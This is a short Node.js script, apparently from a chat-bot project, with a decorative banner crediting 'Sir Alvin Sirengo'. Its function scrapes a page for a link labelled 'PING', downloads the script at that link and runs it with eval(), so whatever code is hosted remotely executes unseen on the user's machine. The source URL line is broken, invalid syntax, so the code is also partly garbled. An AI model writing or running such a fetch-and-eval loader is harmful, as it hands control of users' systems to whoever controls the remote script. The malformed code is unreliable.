//  [ALVIN -DIGITAL QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Alvin Sirengo                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchPINGUrl() {
  try {
    const response = await axios.get(alvins.-DIGITAL);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("PING")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('PING not found 😭');
    }

    console.log('PING loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPINGUrl();
